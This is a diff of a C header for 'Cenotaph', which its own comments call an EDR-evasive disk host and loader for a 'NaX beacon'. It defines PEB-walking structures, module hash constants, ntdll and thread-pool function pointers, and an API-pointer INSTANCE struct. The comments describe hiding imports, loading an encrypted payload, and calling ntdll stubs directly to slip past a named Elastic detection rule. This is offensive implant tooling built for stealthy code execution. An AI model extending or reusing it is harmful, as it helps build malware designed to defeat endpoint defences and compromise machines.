@@ -1,16 +1,12 @@
 /*
- * Cenotaph — EDR-fit disk host / fallback shellcode loader.
+ * Cenotaph — EDR-fit disk host for the NaX beacon.
  * Cenotaph.h: types, hash constants, INSTANCE, casting helpers.
  *
- * Cenotaph is a *normal* native PE (not PIC shellcode), so it may keep a
- * file-scope INSTANCE in .bss — no TLS egghunter, no PIC constraint.
+ * FNV1a seed/prime and module hash constants are byte-identical to NaX
+ * (src_loader/include/Defs.h) so LdrModulePeb resolves the same modules.
  *
- * Design v2:
- *   - Zero IAT imports: every API is resolved at runtime via PEB + FNV1a.
- *   - Encrypted payload: <exe-stem>.dat is nonce(12) || ciphertext || hmac(32).
- *   - ChaCha20 IETF + HMAC-SHA256, key embedded XOR-obfuscated.
- *   - RW -> RX allocation; never RWX.
- *   - Execution hand-off via ntdll thread pool (TppWorkerThread start address).
+ * Cenotaph is a *normal* native PE (not PIC shellcode), so it may keep a
+ * file-scope INSTANCE in .bss — no TLS egghunter, no PIC constraints.
  */
 #ifndef CENOTAPH_H
 #define CENOTAPH_H
@@ -72,9 +68,6 @@ typedef struct _CEN_PEB {
     PVOID  Mutant;                  /* +0x08 */
     PVOID  ImageBaseAddress;        /* +0x10 */
     PCEN_PEB_LDR_DATA Ldr;          /* +0x18 */
-    PVOID  ProcessParameters;       /* +0x20 */
-    PVOID  SubSystemData;           /* +0x28 */
-    PVOID  ProcessHeap;             /* +0x30 */
 } CEN_PEB, *PCEN_PEB;
 
 /* PEB from gs:[0x60] — no API call. */
@@ -87,8 +80,10 @@ static __inline__ PCEN_PEB CenPeb( void ) {
  *  ntdll stubs are reached via PEB walk + export-table resolution and
  *  called through their own ntdll wrappers — NO private `syscall`
  *  instruction, NO indirect-syscall gadget.  Per the fork's live-
- *  validated CRTL/Elastic lesson, direct ntdll-stub calls avoid the
- *  `image_indirect_call` behaviour that trips Elastic rule e7d63d66.
+ *  validated CRTL/Elastic lesson (LESSONS P1 CRTL revision), direct
+ *  ntdll-stub calls avoid the `image_indirect_call` behaviour that
+ *  trips Elastic rule e7d63d66; indirect/direct syscalls are pure
+ *  downside vs Elastic.
  * ------------------------------------------------------------------ */
 
 typedef LONG NTSTATUS;
@@ -106,11 +101,6 @@ typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
     ULONG SystemInformationClass, PVOID SystemInformation,
     ULONG SystemInformationLength, PULONG ReturnLength );
 
-typedef NTSTATUS (NTAPI *PFN_NtClose)( HANDLE Handle );
-
-typedef NTSTATUS (NTAPI *PFN_NtDelayExecution)(
-    BOOLEAN Alertable, PLARGE_INTEGER DelayInterval );
-
 typedef NTSTATUS (NTAPI *PFN_TpAllocWork)(
     PTP_WORK *WorkReturn, PTP_WORK_CALLBACK Callback,
     PVOID Context, PVOID CallbackEnvironment );
@@ -118,7 +108,7 @@ typedef NTSTATUS (NTAPI *PFN_TpAllocWork)(
 typedef VOID (NTAPI *PFN_TpPostWork)( PTP_WORK Work );
 typedef VOID (NTAPI *PFN_TpReleaseWork)( PTP_WORK Work );
 
-/* kernel32 (PEB-walked, not imported) */
+/* kernel32 (PEB-walked) */
 typedef DWORD  (WINAPI *PFN_GetModuleFileNameW)( HMODULE, LPWSTR, DWORD );
 typedef HANDLE (WINAPI *PFN_CreateFileW)( LPCWSTR, DWORD, DWORD,
     LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE );
@@ -143,19 +133,7 @@ typedef struct _CEN_SYS_BASIC {
     CCHAR      NumberOfProcessors;
 } CEN_SYS_BASIC;
 
-#define SystemBasicInformation      0
-#define SystemTimeOfDayInformation  3
-
-/* SYSTEM_TIMEOFDAY_INFORMATION */
-typedef struct _CEN_TIMEOFDAY_INFO {
-    LARGE_INTEGER BootTime;
-    LARGE_INTEGER CurrentTime;
-    LARGE_INTEGER TimeZoneBias;
-    ULONG         TimeZoneId;
-    ULONG         Reserved;
-    ULONGLONG     BootTimeBias;   /* Win8+ */
-    ULONGLONG     CurrentTimeBias;
-} CEN_TIMEOFDAY_INFO;
+#define SystemBasicInformation 0
 
 /* ------------------------------------------------------------------ *
  *  INSTANCE — every PEB-walked API pointer lives here.
@@ -167,13 +145,11 @@ typedef struct _CEN_INSTANCE {
         PFN_NtAllocateVirtualMemory  NtAllocateVirtualMemory;
         PFN_NtProtectVirtualMemory   NtProtectVirtualMemory;
         PFN_NtQuerySystemInformation NtQuerySystemInformation;
-        PFN_NtClose                  NtClose;
-        PFN_NtDelayExecution         NtDelayExecution;
         PFN_TpAllocWork              TpAllocWork;
         PFN_TpPostWork               TpPostWork;
         PFN_TpReleaseWork            TpReleaseWork;
 
-        /* kernel32 (PEB-walked; mundane I/O + path — zero IAT imports) */
+        /* kernel32 (PEB-walked; mundane I/O + path + uptime) */
         PFN_GetModuleFileNameW       GetModuleFileNameW;
         PFN_CreateFileW              CreateFileW;
         PFN_ReadFile                 ReadFile;
